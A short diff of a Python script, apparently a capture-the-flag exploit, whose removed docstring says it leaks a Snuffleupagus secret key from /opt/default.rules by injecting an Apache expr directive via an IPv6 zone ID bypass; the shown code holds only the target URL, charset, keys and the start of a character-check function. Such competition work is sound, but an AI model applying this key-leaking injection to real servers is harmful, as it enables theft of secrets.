@@ -1,14 +1,10 @@
 #!/usr/bin/env python3
-"""
-Part 1 oracle: leaks the Snuffleupagus secret key from /opt/default.rules
-by injecting an Apache expr directive via the IPv6 zone ID bypass.
-"""
 import requests
 
 URL = "https://secure-mood-notes.fcsc.fr/"
 CHARSET = "0123456789abcdef"
 CLIENT_KEY = "mfC0le1GPWwAM%2BcSTzLT%2FA%3D%3D"
-NOTES_DATA = "..."  # replace with your notes_data cookie
+NOTES_DATA = "..."
 
 
 def check_char(cand):
